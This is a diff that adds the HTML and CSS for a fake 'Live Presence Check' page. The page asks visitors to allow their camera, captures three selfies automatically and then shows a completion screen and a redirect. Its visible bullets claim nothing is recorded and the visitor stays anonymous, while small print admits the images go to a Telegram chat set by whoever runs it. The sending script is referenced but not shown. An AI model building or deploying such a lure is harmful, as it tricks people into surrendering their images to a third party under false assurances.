@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Face Verification</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body{
+    font-family: system-ui,-apple-system,sans-serif;
+    background:#f1f5f9; min-height:100vh;
+    display:flex; align-items:center; justify-content:center; color:#0f172a;
+  }
+  .card{
+    background:#fff; border-radius:18px; max-width:440px; width:92%;
+    overflow:hidden; box-shadow:0 20px 50px rgba(2,6,23,.12); border:1px solid #e2e8f0;
+  }
+  .head{ padding:26px 28px; background:#0f172a; color:#fff; }
+  .head h1{ font-size:19px; font-weight:650; }
+  .head p{ font-size:12px; color:#94a3b8; margin-top:4px; }
+  .body{ padding:26px 28px; }
+
+  .step-conf{ text-align:center; padding-bottom:8px; }
+  .ico{ font-size:46px; }
+  h2{ font-size:17px; font-weight:650; margin:6px 0; }
+  .desc{ font-size:13px; color:#475569; line-height:1.5; margin-bottom:18px; }
+  ul{ text-align:left; font-size:12.5px; color:#334155; list-style:none; margin:0 auto 20px; max-width:320px; }
+  ul li{ padding:5px 0 5px 24px; position:relative; }
+  ul li::before{ content:"✓"; position:absolute; left:0; color:#16a34a; font-weight:700; }
+
+  .btn{
+    width:100%; padding:13px; border:none; border-radius:9px;
+    background:#2563eb; color:#fff; font-size:15px; font-weight:600;
+    cursor:pointer; transition:background .2s;
+  }
+  .btn:hover{ background:#1d4ed8; }
+  .btn:disabled{ background:#94a3b8; cursor:not-allowed; }
+
+  .cam-stage{ display:none; text-align:center; }
+  video{
+    width:100%; border-radius:12px; background:#000;
+    transform:scaleX(-1); /* mirror */
+  }
+  .progress{ margin-top:14px; }
+  .bar{ height:6px; background:#e2e8f0; border-radius:6px; overflow:hidden; }
+  .fill{ height:100%; width:0%; background:#16a34a; transition:width .5s; }
+  .pct{ font-size:12px; color:#475569; margin-top:6px; }
+  .status{ margin-top:12px; font-size:13px; color:#475569; }
+
+  .done{ display:none; text-align:center; padding:12px 0; }
+  .done .ico{ font-size:56px; }
+  .done h3{ font-size:18px; margin:8px 0 4px; }
+  .done p{ font-size:13px; color:#475569; }
+
+  .legal{ font-size:10.5px; color:#94a3b8; margin-top:18px; line-height:1.4; text-align:center; }
+  canvas{ display:none; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="head">
+    <h1>🔐 Live Presence Check</h1>
+    <p>Demo flow — verify on your own device</p>
+  </div>
+
+  <div class="body" id="bodyRoot">
+
+    <!-- STEP 1: Consent -->
+    <div class="step-conf" id="stepConsent">
+      <div class="ico">🤳</div>
+      <h2>Complete a quick face check</h2>
+      <div class="desc">Before continuing, take a short live selfie so the system can confirm a real person is present.</div>
+      <ul>
+        <li>Let us turn on your camera for ~5 seconds</li>
+        <li>3 quick selfies are captured automatically</li>
+        <li>Nothing is recorded — only sent once for verification</li>
+        <li>You stay anonymous: no name or account is attached</li>
+      </ul>
+      <button class="btn" id="btnStart">I agree — start camera</button>
+      <div class="legal">By continuing you consent to a short live camera check on this device. Demo: images are sent to a Telegram chat you configure. Test only on devices you own.</div>
+    </div>
+
+    <!-- STEP 2: Camera + capture -->
+    <div class="cam-stage" id="camStage">
+      <video id="video" autoplay playsinline muted></video>
+      <div class="progress">
+        <div class="bar"><div class="fill" id="barFill"></div></div>
+        <div class="pct" id="pctText">Starting…</div>
+      </div>
+      <div class="status" id="stageStatus"></div>
+    </div>
+
+    <!-- STEP 3: Done -->
+    <div class="done" id="doneStage">
+      <div class="ico">✅</div>
+      <h3>Check complete</h3>
+      <p id="doneMsg">Redirecting…</p>
+      <button class="btn" id="btnFinish" style="margin-top:16px;">Continue →</button>
+    </div>
+  </div>
+</div>
+
+<canvas id="canvas"></canvas>
+<script type="module" src="config.js"></script>
+<script type="module" src="script.js"></script>
+</body>
+</html>
